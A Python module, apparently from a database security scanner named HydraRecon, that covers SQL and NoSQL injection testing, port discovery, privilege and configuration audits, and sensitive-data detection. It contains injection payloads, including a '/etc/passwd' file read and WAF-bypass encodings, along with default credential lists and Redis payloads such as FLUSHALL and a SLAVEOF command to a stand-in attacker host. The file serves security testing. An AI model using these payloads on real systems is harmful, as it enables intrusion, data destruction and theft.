#!/usr/bin/env python3
"""
HydraRecon Advanced Database Security Module
████████████████████████████████████████████████████████████████████████████████
█  ENTERPRISE DATABASE SECURITY - SQL Injection Testing, Privilege Analysis,   █
█  Configuration Auditing, Data Leak Detection & Database Forensics            █
████████████████████████████████████████████████████████████████████████████████
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import re
import socket
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Union


class DatabaseType(Enum):
    """Supported database types"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    MONGODB = "mongodb"
    REDIS = "redis"
    CASSANDRA = "cassandra"
    SQLITE = "sqlite"
    MARIADB = "mariadb"
    COUCHDB = "couchdb"


class SeverityLevel(Enum):
    """Security finding severity"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnerabilityType(Enum):
    """Database vulnerability types"""
    SQL_INJECTION = "sql_injection"
    NOSQL_INJECTION = "nosql_injection"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    WEAK_CREDENTIALS = "weak_credentials"
    DEFAULT_CREDENTIALS = "default_credentials"
    UNPATCHED_VERSION = "unpatched_version"
    INSECURE_CONFIGURATION = "insecure_configuration"
    EXPOSED_SERVICE = "exposed_service"
    DATA_EXPOSURE = "data_exposure"
    BACKUP_EXPOSURE = "backup_exposure"
    AUDIT_DISABLED = "audit_disabled"
    ENCRYPTION_DISABLED = "encryption_disabled"


@dataclass
class DatabaseInfo:
    """Database instance information"""
    host: str
    port: int
    db_type: DatabaseType
    version: str
    databases: List[str]
    users: List[str]
    is_exposed: bool = False
    requires_auth: bool = True
    ssl_enabled: bool = False


@dataclass
class SQLInjectionPayload:
    """SQL injection test payload"""
    name: str
    payload: str
    db_types: List[DatabaseType]
    category: str
    detection_pattern: str


@dataclass
class SecurityFinding:
    """Database security finding"""
    title: str
    severity: SeverityLevel
    vuln_type: VulnerabilityType
    description: str
    evidence: str
    remediation: str
    database: str
    cve: Optional[str] = None
    cvss: Optional[float] = None


@dataclass
class PrivilegeInfo:
    """Database user privilege information"""
    username: str
    host: str
    databases: List[str]
    privileges: List[str]
    is_admin: bool = False
    can_grant: bool = False
    password_expires: Optional[datetime] = None


@dataclass
class ScanResult:
    """Complete database security scan result"""
    database_info: DatabaseInfo
    findings: List[SecurityFinding]
    privileges: List[PrivilegeInfo]
    sensitive_data: List[Dict[str, Any]]
    configuration: Dict[str, Any]
    timestamp: datetime = field(default_factory=datetime.now)


class SQLInjectionTester:
    """SQL Injection vulnerability testing"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # SQL injection payloads by category
        self.payloads = self._load_payloads()
        
        # Error patterns for detection
        self.error_patterns = {
            DatabaseType.MYSQL: [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"check the manual that corresponds to your MySQL server version",
                r"MySqlClient\.",
                r"com\.mysql\.jdbc"
            ],
            DatabaseType.POSTGRESQL: [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"PG::SyntaxError",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s+syntax error at or near"
            ],
            DatabaseType.MSSQL: [
                r"Driver.*SQL[\-\_\ ]*Server",
                r"OLE DB.*SQL Server",
                r"(\W|\A)SQL Server.*Driver",
                r"Warning.*mssql_",
                r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
                r"System\.Data\.SqlClient\.SqlException",
                r"Unclosed quotation mark after the character string"
            ],
            DatabaseType.ORACLE: [
                r"\bORA-[0-9][0-9][0-9][0-9]",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_",
                r"Warning.*\Wora_",
                r"oracle\.jdbc\.driver"
            ],
            DatabaseType.SQLITE: [
                r"SQLite/JDBCDriver",
                r"SQLite\.Exception",
                r"System\.Data\.SQLite\.SQLiteException",
                r"Warning.*sqlite_",
                r"Warning.*SQLite3::",
                r"\[SQLITE_ERROR\]"
            ]
        }
    
    def _load_payloads(self) -> List[SQLInjectionPayload]:
        """Load SQL injection test payloads"""
        return [
            # Error-based SQLi
            SQLInjectionPayload(
                name="Single Quote Test",
                payload="'",
                db_types=[DatabaseType.MYSQL, DatabaseType.POSTGRESQL, DatabaseType.MSSQL, DatabaseType.ORACLE],
                category="error_based",
                detection_pattern=r"(syntax|error|exception)"
            ),
            SQLInjectionPayload(
                name="Double Quote Test",
                payload='"',
                db_types=[DatabaseType.MYSQL, DatabaseType.POSTGRESQL],
                category="error_based",
                detection_pattern=r"(syntax|error|exception)"
            ),
            SQLInjectionPayload(
                name="Comment Injection",
                payload="'--",
                db_types=[DatabaseType.MYSQL, DatabaseType.POSTGRESQL, DatabaseType.MSSQL],
                category="error_based",
                detection_pattern=r"(syntax|error|exception)"
            ),
            SQLInjectionPayload(
                name="OR 1=1 Classic",
                payload="' OR '1'='1",
                db_types=[DatabaseType.MYSQL, DatabaseType.POSTGRESQL, DatabaseType.MSSQL, DatabaseType.ORACLE],
                category="boolean_based",
                detection_pattern=r".*"
            ),
            SQLInjectionPayload(
                name="OR 1=1 Comment",
                payload="' OR 1=1--",
                db_types=[DatabaseType.MYSQL, DatabaseType.POSTGRESQL, DatabaseType.MSSQL],
                category="boolean_based",
                detection_pattern=r".*"
            ),
            # Union-based SQLi
            SQLInjectionPayload(
                name="Union Select NULL",
                payload="' UNION SELECT NULL--",
                db_types=[DatabaseType.MYSQL, DatabaseType.POSTGRESQL, DatabaseType.MSSQL],
                category="union_based",
                detection_pattern=r"(union|null)"
            ),
            SQLInjectionPayload(
                name="Union Select Version",
                payload="' UNION SELECT @@version--",
                db_types=[DatabaseType.MYSQL, DatabaseType.MSSQL],
                category="union_based",
                detection_pattern=r"(version|mysql|microsoft)"
            ),
            # Time-based blind SQLi
            SQLInjectionPayload(
                name="MySQL Sleep",
                payload="' AND SLEEP(5)--",
                db_types=[DatabaseType.MYSQL, DatabaseType.MARIADB],
                category="time_based",
                detection_pattern=r".*"
            ),
            SQLInjectionPayload(
                name="PostgreSQL pg_sleep",
                payload="'; SELECT pg_sleep(5)--",
                db_types=[DatabaseType.POSTGRESQL],
                category="time_based",
                detection_pattern=r".*"
            ),
            SQLInjectionPayload(
                name="MSSQL WAITFOR",
                payload="'; WAITFOR DELAY '0:0:5'--",
                db_types=[DatabaseType.MSSQL],
                category="time_based",
                detection_pattern=r".*"
            ),
            # Stacked queries
            SQLInjectionPayload(
                name="Stacked Query Basic",
                payload="'; SELECT 1--",
                db_types=[DatabaseType.MSSQL, DatabaseType.POSTGRESQL],
                category="stacked",
                detection_pattern=r".*"
            ),
            # Out-of-band
            SQLInjectionPayload(
                name="MySQL Load File",
                payload="' UNION SELECT LOAD_FILE('/etc/passwd')--",
                db_types=[DatabaseType.MYSQL],
                category="oob",
                detection_pattern=r"(root:|nobody:|www-data:)"
            )
        ]
    
    def detect_db_type(self, response: str) -> Optional[DatabaseType]:
        """Detect database type from error response"""
        response_lower = response.lower()
        
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    return db_type
        
        return None
    
    def test_sqli(
        self,
        response: str,
        baseline_response: str,
        payload: SQLInjectionPayload
    ) -> Tuple[bool, Optional[str]]:
        """Test if SQL injection was successful"""
        # Check for error-based SQLi
        if payload.category == "error_based":
            for db_type, patterns in self.error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, response, re.IGNORECASE):
                        return True, f"Error-based SQLi detected ({db_type.value})"
        
        # Check for boolean-based SQLi (response difference)
        if payload.category == "boolean_based":
            if len(response) != len(baseline_response):
                return True, "Boolean-based SQLi detected (response length changed)"
        
        # Check for union-based SQLi
        if payload.category == "union_based":
            if re.search(payload.detection_pattern, response, re.IGNORECASE):
                return True, "Union-based SQLi detected"
        
        return False, None
    
    def generate_waf_bypass_payloads(
        self,
        original_payload: str
    ) -> List[str]:
        """Generate WAF bypass variants of payload"""
        variants = []
        
        # Case variation
        variants.append(original_payload.swapcase())
        
        # Inline comments
        variants.append(original_payload.replace(" ", "/**/"))
        
        # URL encoding
        variants.append(original_payload.replace("'", "%27").replace(" ", "%20"))
        
        # Double URL encoding
        variants.append(original_payload.replace("'", "%2527").replace(" ", "%2520"))
        
        # Unicode encoding
        variants.append(original_payload.replace("'", "\\u0027"))
        
        # Null byte injection
        variants.append(original_payload.replace("'", "%00'"))
        
        # Tab/newline substitution
        variants.append(original_payload.replace(" ", "\t"))
        variants.append(original_payload.replace(" ", "\n"))
        
        return variants


class NoSQLInjectionTester:
    """NoSQL Injection vulnerability testing"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # MongoDB injection payloads
        self.mongodb_payloads = [
            # Authentication bypass
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            
            # Operator injection
            '{"$or": [{}]}',
            '{"$and": [{}]}',
            
            # JavaScript injection
            '";return true;"',
            "';return this.password;'",
            '"; while(true){}; "',
            
            # Array injection
            '[$ne]=1',
            '[$gt]=',
            '[$regex]=.*'
        ]
        
        # Redis injection payloads
        self.redis_payloads = [
            '\r\nKEYS *\r\n',
            '\r\nCONFIG GET *\r\n',
            '\r\nINFO\r\n',
            '\r\nFLUSHALL\r\n',
            '\r\nSLAVEOF attacker.com 6379\r\n'
        ]
    
    def test_mongodb_injection(
        self,
        response: str,
        baseline_response: str
    ) -> Tuple[bool, Optional[str]]:
        """Test for MongoDB injection"""
        # Check for authentication bypass
        if len(response) > len(baseline_response) * 1.5:
            return True, "Potential MongoDB injection (excessive data returned)"
        
        # Check for error disclosure
        mongodb_errors = [
            "MongoError",
            "BSONTypeError",
            "cannot use \\$",
            "unknown operator",
            "invalid operator"
        ]
        
        for error in mongodb_errors:
            if error.lower() in response.lower():
                return True, f"MongoDB injection indicator: {error}"
        
        return False, None


class DatabaseScanner:
    """Database service discovery and scanning"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # Default ports
        self.default_ports = {
            DatabaseType.MYSQL: [3306, 3307],
            DatabaseType.POSTGRESQL: [5432, 5433],
            DatabaseType.MSSQL: [1433, 1434],
            DatabaseType.ORACLE: [1521, 1522, 1525],
            DatabaseType.MONGODB: [27017, 27018, 27019],
            DatabaseType.REDIS: [6379, 6380],
            DatabaseType.CASSANDRA: [9042, 9160],
            DatabaseType.COUCHDB: [5984, 6984]
        }
        
        # Default credentials to test
        self.default_creds = {
            DatabaseType.MYSQL: [
                ("root", ""),
                ("root", "root"),
                ("root", "mysql"),
                ("admin", "admin"),
                ("mysql", "mysql")
            ],
            DatabaseType.POSTGRESQL: [
                ("postgres", "postgres"),
                ("postgres", ""),
                ("admin", "admin")
            ],
            DatabaseType.MSSQL: [
                ("sa", ""),
                ("sa", "sa"),
                ("sa", "password")
            ],
            DatabaseType.MONGODB: [
                ("admin", "admin"),
                ("root", "root"),
                ("", "")  # No auth
            ],
            DatabaseType.REDIS: [
                ("", ""),  # No auth
                ("", "redis"),
                ("default", "")
            ]
        }
    
    async def discover_databases(
        self,
        host: str,
        port_range: Optional[Tuple[int, int]] = None
    ) -> List[DatabaseInfo]:
        """Discover database services on host"""
        discovered = []
        
        # Scan common database ports
        ports_to_scan = []
        if port_range:
            ports_to_scan = list(range(port_range[0], port_range[1] + 1))
        else:
            for db_ports in self.default_ports.values():
                ports_to_scan.extend(db_ports)
        
        for port in set(ports_to_scan):
            try:
                db_type = await self._identify_database(host, port)
                if db_type:
                    info = await self._get_database_info(host, port, db_type)
                    if info:
                        discovered.append(info)
            except Exception as e:
                self.logger.debug(f"Error scanning {host}:{port}: {e}")
        
        return discovered
    
    async def _identify_database(
        self,
        host: str,
        port: int
    ) -> Optional[DatabaseType]:
        """Identify database type by banner/response"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=5
            )
            
            # Read banner
            try:
                banner = await asyncio.wait_for(reader.read(1024), timeout=3)
                banner_str = banner.decode('utf-8', errors='ignore').lower()
            except asyncio.TimeoutError:
                banner_str = ""
            
            writer.close()
            await writer.wait_closed()
            
            # Identify by banner
            if 'mysql' in banner_str or 'mariadb' in banner_str:
                return DatabaseType.MYSQL
            elif 'postgresql' in banner_str:
                return DatabaseType.POSTGRESQL
            elif 'mongodb' in banner_str:
                return DatabaseType.MONGODB
            elif 'redis' in banner_str:
                return DatabaseType.REDIS
            
            # Identify by port
            for db_type, ports in self.default_ports.items():
                if port in ports:
                    return db_type
            
        except Exception as e:
            self.logger.debug(f"Database identification error: {e}")
        
        return None
    
    async def _get_database_info(
        self,
        host: str,
        port: int,
        db_type: DatabaseType
    ) -> Optional[DatabaseInfo]:
        """Get detailed database information"""
        info = DatabaseInfo(
            host=host,
            port=port,
            db_type=db_type,
            version="Unknown",
            databases=[],
            users=[],
            is_exposed=True,
            requires_auth=True
        )
        
        # Try to connect and get info
        if db_type == DatabaseType.REDIS:
            info = await self._probe_redis(host, port, info)
        elif db_type == DatabaseType.MONGODB:
            info = await self._probe_mongodb(host, port, info)
        
        return info
    
    async def _probe_redis(
        self,
        host: str,
        port: int,
        info: DatabaseInfo
    ) -> DatabaseInfo:
        """Probe Redis for information"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=5
            )
            
            # Try INFO command (no auth)
            writer.write(b"INFO\r\n")
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(4096), timeout=3)
            response_str = response.decode('utf-8', errors='ignore')
            
            if 'redis_version' in response_str:
                info.requires_auth = False
                # Parse version
                for line in response_str.split('\n'):
                    if line.startswith('redis_version:'):
                        info.version = line.split(':')[1].strip()
                        break
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            self.logger.debug(f"Redis probe error: {e}")
        
        return info
    
    async def _probe_mongodb(
        self,
        host: str,
        port: int,
        info: DatabaseInfo
    ) -> DatabaseInfo:
        """Probe MongoDB for information"""
        try:
            # MongoDB wire protocol
            # This is a simplified probe
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=5
            )
            
            # Build OP_MSG for serverStatus
            # Simplified - in production use proper MongoDB driver
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            self.logger.debug(f"MongoDB probe error: {e}")
        
        return info
    
    async def test_default_credentials(
        self,
        db_info: DatabaseInfo
    ) -> List[Tuple[str, str]]:
        """Test for default credentials"""
        valid_creds = []
        
        creds_to_test = self.default_creds.get(db_info.db_type, [])
        
        for username, password in creds_to_test:
            if await self._test_auth(db_info, username, password):
                valid_creds.append((username, password))
        
        return valid_creds
    
    async def _test_auth(
        self,
        db_info: DatabaseInfo,
        username: str,
        password: str
    ) -> bool:
        """Test authentication credentials"""
        # This is a placeholder - actual implementation would use
        # database-specific authentication protocols
        return False


class PrivilegeAnalyzer:
    """Analyze database user privileges"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # Dangerous privileges
        self.dangerous_privileges = {
            DatabaseType.MYSQL: [
                'SUPER', 'FILE', 'PROCESS', 'SHUTDOWN',
                'GRANT OPTION', 'CREATE USER', 'RELOAD'
            ],
            DatabaseType.POSTGRESQL: [
                'SUPERUSER', 'CREATEDB', 'CREATEROLE',
                'REPLICATION', 'BYPASSRLS'
            ],
            DatabaseType.MSSQL: [
                'sysadmin', 'serveradmin', 'securityadmin',
                'db_owner', 'db_securityadmin'
            ]
        }
    
    def analyze_privileges(
        self,
        privileges: List[PrivilegeInfo],
        db_type: DatabaseType
    ) -> List[SecurityFinding]:
        """Analyze privileges for security issues"""
        findings = []
        
        dangerous = self.dangerous_privileges.get(db_type, [])
        
        for priv in privileges:
            # Check for admin/superuser
            if priv.is_admin:
                findings.append(SecurityFinding(
                    title=f"Administrative User: {priv.username}",
                    severity=SeverityLevel.INFO,
                    vuln_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                    description=f"User {priv.username} has administrative privileges",
                    evidence=f"Privileges: {', '.join(priv.privileges)}",
                    remediation="Review if administrative access is required",
                    database=priv.host
                ))
            
            # Check for dangerous privileges
            for priv_name in priv.privileges:
                if priv_name.upper() in [d.upper() for d in dangerous]:
                    findings.append(SecurityFinding(
                        title=f"Dangerous Privilege: {priv_name}",
                        severity=SeverityLevel.MEDIUM,
                        vuln_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                        description=f"User {priv.username} has dangerous privilege: {priv_name}",
                        evidence=f"Grant: {priv_name}",
                        remediation="Revoke unnecessary dangerous privileges",
                        database=priv.host
                    ))
            
            # Check for GRANT option
            if priv.can_grant:
                findings.append(SecurityFinding(
                    title=f"User Can Grant Privileges: {priv.username}",
                    severity=SeverityLevel.MEDIUM,
                    vuln_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                    description=f"User {priv.username} can grant privileges to other users",
                    evidence="WITH GRANT OPTION",
                    remediation="Remove GRANT OPTION unless explicitly needed",
                    database=priv.host
                ))
            
            # Check for wildcard host access
            if priv.host == '%' or priv.host == '*':
                findings.append(SecurityFinding(
                    title=f"Wildcard Host Access: {priv.username}",
                    severity=SeverityLevel.MEDIUM,
                    vuln_type=VulnerabilityType.INSECURE_CONFIGURATION,
                    description=f"User {priv.username} can connect from any host",
                    evidence=f"Host: {priv.host}",
                    remediation="Restrict host access to specific IPs",
                    database=priv.host
                ))
        
        return findings


class ConfigurationAuditor:
    """Audit database security configuration"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def audit_mysql_config(self, config: Dict[str, Any]) -> List[SecurityFinding]:
        """Audit MySQL/MariaDB configuration"""
        findings = []
        
        # Check for local-infile
        if config.get('local_infile', '').upper() == 'ON':
            findings.append(SecurityFinding(
                title="LOCAL INFILE Enabled",
                severity=SeverityLevel.HIGH,
                vuln_type=VulnerabilityType.INSECURE_CONFIGURATION,
                description="LOCAL INFILE is enabled, allowing file reads",
                evidence="local_infile = ON",
                remediation="Disable LOCAL INFILE: SET GLOBAL local_infile = 0",
                database="MySQL"
            ))
        
        # Check for skip-grant-tables
        if config.get('skip_grant_tables', False):
            findings.append(SecurityFinding(
                title="Skip Grant Tables Enabled",
                severity=SeverityLevel.CRITICAL,
                vuln_type=VulnerabilityType.INSECURE_CONFIGURATION,
                description="skip-grant-tables bypasses all authentication",
                evidence="skip-grant-tables = true",
                remediation="Remove skip-grant-tables from configuration",
                database="MySQL"
            ))
        
        # Check for SSL/TLS
        if not config.get('have_ssl', '').upper() == 'YES':
            findings.append(SecurityFinding(
                title="SSL/TLS Not Enabled",
                severity=SeverityLevel.MEDIUM,
                vuln_type=VulnerabilityType.ENCRYPTION_DISABLED,
                description="Database connections are not encrypted",
                evidence="have_ssl = DISABLED",
                remediation="Enable SSL/TLS for database connections",
                database="MySQL"
            ))
        
        # Check for password validation
        if not config.get('validate_password_policy'):
            findings.append(SecurityFinding(
                title="Password Validation Disabled",
                severity=SeverityLevel.MEDIUM,
                vuln_type=VulnerabilityType.INSECURE_CONFIGURATION,
                description="Password validation plugin is not active",
                evidence="validate_password not loaded",
                remediation="Enable and configure validate_password plugin",
                database="MySQL"
            ))
        
        # Check for audit logging
        if not config.get('general_log', '').upper() == 'ON':
            findings.append(SecurityFinding(
                title="General Query Log Disabled",
                severity=SeverityLevel.LOW,
                vuln_type=VulnerabilityType.AUDIT_DISABLED,
                description="General query logging is disabled",
                evidence="general_log = OFF",
                remediation="Enable general_log for security auditing",
                database="MySQL"
            ))
        
        return findings
    
    def audit_postgresql_config(self, config: Dict[str, Any]) -> List[SecurityFinding]:
        """Audit PostgreSQL configuration"""
        findings = []
        
        # Check for SSL
        if config.get('ssl', '').lower() != 'on':
            findings.append(SecurityFinding(
                title="SSL Not Enabled",
                severity=SeverityLevel.MEDIUM,
                vuln_type=VulnerabilityType.ENCRYPTION_DISABLED,
                description="SSL is not enabled for PostgreSQL",
                evidence="ssl = off",
                remediation="Enable SSL in postgresql.conf",
                database="PostgreSQL"
            ))
        
        # Check for password encryption
        if config.get('password_encryption', '').lower() == 'off':
            findings.append(SecurityFinding(
                title="Password Encryption Disabled",
                severity=SeverityLevel.HIGH,
                vuln_type=VulnerabilityType.INSECURE_CONFIGURATION,
                description="Password encryption is disabled",
                evidence="password_encryption = off",
                remediation="Enable password_encryption",
                database="PostgreSQL"
            ))
        
        # Check for logging
        if config.get('log_statement', '').lower() == 'none':
            findings.append(SecurityFinding(
                title="Statement Logging Disabled",
                severity=SeverityLevel.LOW,
                vuln_type=VulnerabilityType.AUDIT_DISABLED,
                description="SQL statement logging is disabled",
                evidence="log_statement = none",
                remediation="Set log_statement to at least 'ddl'",
                database="PostgreSQL"
            ))
        
        return findings
    
    def audit_mongodb_config(self, config: Dict[str, Any]) -> List[SecurityFinding]:
        """Audit MongoDB configuration"""
        findings = []
        
        # Check for authentication
        if not config.get('authorization', '').lower() == 'enabled':
            findings.append(SecurityFinding(
                title="Authorization Disabled",
                severity=SeverityLevel.CRITICAL,
                vuln_type=VulnerabilityType.INSECURE_CONFIGURATION,
                description="MongoDB authorization is disabled",
                evidence="security.authorization = disabled",
                remediation="Enable authorization in mongod.conf",
                database="MongoDB"
            ))
        
        # Check for binding
        bind_ip = config.get('bind_ip', '0.0.0.0')
        if bind_ip == '0.0.0.0':
            findings.append(SecurityFinding(
                title="MongoDB Bound to All Interfaces",
                severity=SeverityLevel.HIGH,
                vuln_type=VulnerabilityType.EXPOSED_SERVICE,
                description="MongoDB is accessible from any interface",
                evidence=f"bindIp = {bind_ip}",
                remediation="Bind to specific interfaces only",
                database="MongoDB"
            ))
        
        return findings


class SensitiveDataScanner:
    """Scan for sensitive data in databases"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # Sensitive column patterns
        self.sensitive_patterns = {
            'pii': [
                r'(ssn|social.?security)',
                r'(dob|birth.?date|date.?of.?birth)',
                r'(passport)',
                r'(driver.?license)',
                r'(national.?id)'
            ],
            'financial': [
                r'(credit.?card|cc.?num)',
                r'(card.?number)',
                r'(cvv|cvc)',
                r'(bank.?account)',
                r'(routing.?number)',
                r'(iban|swift)'
            ],
            'credentials': [
                r'(password|passwd|pwd)',
                r'(secret|token|key)',
                r'(api.?key)',
                r'(private.?key)',
                r'(access.?token)'
            ],
            'health': [
                r'(medical|health)',
                r'(diagnosis|condition)',
                r'(prescription|medication)',
                r'(insurance.?id)'
            ]
        }
        
        # Sensitive data value patterns
        self.value_patterns = {
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'phone': r'\b(?:\+\d{1,2}\s?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b',
            'ip_address': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        }
    
    def analyze_schema(
        self,
        schema: Dict[str, List[str]]
    ) -> List[Dict[str, Any]]:
        """Analyze database schema for sensitive columns"""
        sensitive_columns = []
        
        for table, columns in schema.items():
            for column in columns:
                column_lower = column.lower()
                
                for category, patterns in self.sensitive_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, column_lower, re.IGNORECASE):
                            sensitive_columns.append({
                                'table': table,
                                'column': column,
                                'category': category,
                                'pattern': pattern,
                                'risk': 'high' if category in ['credentials', 'financial'] else 'medium'
                            })
                            break
        
        return sensitive_columns
    
    def scan_sample_data(
        self,
        data: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Scan sample data for sensitive values"""
        findings = []
        
        for row in data:
            for column, value in row.items():
                if not isinstance(value, str):
                    continue
                
                for data_type, pattern in self.value_patterns.items():
                    if re.search(pattern, value):
                        findings.append({
                            'column': column,
                            'data_type': data_type,
                            'sample': value[:20] + '...' if len(value) > 20 else value,
                            'risk': 'high'
                        })
        
        return findings


class AdvancedDatabaseSecurity:
    """Main database security analysis engine"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # Initialize components
        self.sqli_tester = SQLInjectionTester()
        self.nosql_tester = NoSQLInjectionTester()
        self.scanner = DatabaseScanner()
        self.privilege_analyzer = PrivilegeAnalyzer()
        self.config_auditor = ConfigurationAuditor()
        self.data_scanner = SensitiveDataScanner()
        
        # Statistics
        self.stats = {
            "databases_scanned": 0,
            "vulnerabilities_found": 0,
            "default_creds_found": 0,
            "sensitive_columns": 0
        }
    
    async def full_scan(
        self,
        host: str,
        ports: Optional[List[int]] = None
    ) -> List[ScanResult]:
        """Perform comprehensive database security scan"""
        results = []
        
        # Discover databases
        if ports:
            port_range = (min(ports), max(ports))
        else:
            port_range = None
        
        discovered = await self.scanner.discover_databases(host, port_range)
        
        for db_info in discovered:
            self.stats["databases_scanned"] += 1
            
            findings = []
            
            # Check for exposed service
            if db_info.is_exposed:
                findings.append(SecurityFinding(
                    title=f"Exposed {db_info.db_type.value} Service",
                    severity=SeverityLevel.HIGH if not db_info.requires_auth else SeverityLevel.MEDIUM,
                    vuln_type=VulnerabilityType.EXPOSED_SERVICE,
                    description=f"{db_info.db_type.value} is exposed on port {db_info.port}",
                    evidence=f"Port {db_info.port} is accessible",
                    remediation="Restrict access using firewall rules",
                    database=f"{host}:{db_info.port}"
                ))
            
            # Check for no authentication
            if not db_info.requires_auth:
                findings.append(SecurityFinding(
                    title=f"No Authentication Required - {db_info.db_type.value}",
                    severity=SeverityLevel.CRITICAL,
                    vuln_type=VulnerabilityType.INSECURE_CONFIGURATION,
                    description="Database accepts connections without authentication",
                    evidence="Anonymous access allowed",
                    remediation="Enable authentication",
                    database=f"{host}:{db_info.port}"
                ))
            
            # Test default credentials
            valid_creds = await self.scanner.test_default_credentials(db_info)
            for username, password in valid_creds:
                self.stats["default_creds_found"] += 1
                findings.append(SecurityFinding(
                    title=f"Default Credentials - {db_info.db_type.value}",
                    severity=SeverityLevel.CRITICAL,
                    vuln_type=VulnerabilityType.DEFAULT_CREDENTIALS,
                    description=f"Default credentials work: {username}",
                    evidence=f"Username: {username}, Password: {'*' * len(password) if password else '(empty)'}",
                    remediation="Change default credentials immediately",
                    database=f"{host}:{db_info.port}"
                ))
            
            # Check SSL/TLS
            if not db_info.ssl_enabled:
                findings.append(SecurityFinding(
                    title=f"No Encryption - {db_info.db_type.value}",
                    severity=SeverityLevel.MEDIUM,
                    vuln_type=VulnerabilityType.ENCRYPTION_DISABLED,
                    description="Database connections are not encrypted",
                    evidence="SSL/TLS not enabled",
                    remediation="Enable SSL/TLS encryption",
                    database=f"{host}:{db_info.port}"
                ))
            
            self.stats["vulnerabilities_found"] += len(findings)
            
            results.append(ScanResult(
                database_info=db_info,
                findings=findings,
                privileges=[],
                sensitive_data=[],
                configuration={}
            ))
        
        return results
    
    def test_sql_injection(
        self,
        endpoint: str,
        parameter: str,
        baseline_response: str
    ) -> List[SecurityFinding]:
        """Test endpoint for SQL injection vulnerabilities"""
        findings = []
        
        for payload in self.sqli_tester.payloads:
            # In production, this would actually make HTTP requests
            # with the payload injected into the parameter
            pass
        
        return findings
    
    def analyze_schema_security(
        self,
        schema: Dict[str, List[str]]
    ) -> List[Dict[str, Any]]:
        """Analyze database schema for security issues"""
        sensitive = self.data_scanner.analyze_schema(schema)
        self.stats["sensitive_columns"] += len(sensitive)
        return sensitive
    
    def audit_configuration(
        self,
        db_type: DatabaseType,
        config: Dict[str, Any]
    ) -> List[SecurityFinding]:
        """Audit database configuration"""
        if db_type == DatabaseType.MYSQL or db_type == DatabaseType.MARIADB:
            return self.config_auditor.audit_mysql_config(config)
        elif db_type == DatabaseType.POSTGRESQL:
            return self.config_auditor.audit_postgresql_config(config)
        elif db_type == DatabaseType.MONGODB:
            return self.config_auditor.audit_mongodb_config(config)
        return []
    
    def generate_report(
        self,
        results: List[ScanResult]
    ) -> Dict[str, Any]:
        """Generate security report"""
        report = {
            "summary": {
                "total_databases": len(results),
                "critical_findings": 0,
                "high_findings": 0,
                "medium_findings": 0,
                "low_findings": 0
            },
            "databases": [],
            "recommendations": []
        }
        
        for result in results:
            db_report = {
                "host": result.database_info.host,
                "port": result.database_info.port,
                "type": result.database_info.db_type.value,
                "version": result.database_info.version,
                "findings": []
            }
            
            for finding in result.findings:
                db_report["findings"].append({
                    "title": finding.title,
                    "severity": finding.severity.value,
                    "type": finding.vuln_type.value,
                    "description": finding.description,
                    "remediation": finding.remediation
                })
                
                if finding.severity == SeverityLevel.CRITICAL:
                    report["summary"]["critical_findings"] += 1
                elif finding.severity == SeverityLevel.HIGH:
                    report["summary"]["high_findings"] += 1
                elif finding.severity == SeverityLevel.MEDIUM:
                    report["summary"]["medium_findings"] += 1
                elif finding.severity == SeverityLevel.LOW:
                    report["summary"]["low_findings"] += 1
            
            report["databases"].append(db_report)
        
        # Add general recommendations
        if report["summary"]["critical_findings"] > 0:
            report["recommendations"].append(
                "Address all critical findings immediately"
            )
        
        return report
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get scanning statistics"""
        return self.stats
    
    def export_results(self, results: List[ScanResult]) -> str:
        """Export results to JSON"""
        return json.dumps([
            {
                "database": {
                    "host": r.database_info.host,
                    "port": r.database_info.port,
                    "type": r.database_info.db_type.value,
                    "version": r.database_info.version,
                    "exposed": r.database_info.is_exposed,
                    "requires_auth": r.database_info.requires_auth
                },
                "findings": [
                    {
                        "title": f.title,
                        "severity": f.severity.value,
                        "type": f.vuln_type.value,
                        "description": f.description
                    }
                    for f in r.findings
                ],
                "timestamp": r.timestamp.isoformat()
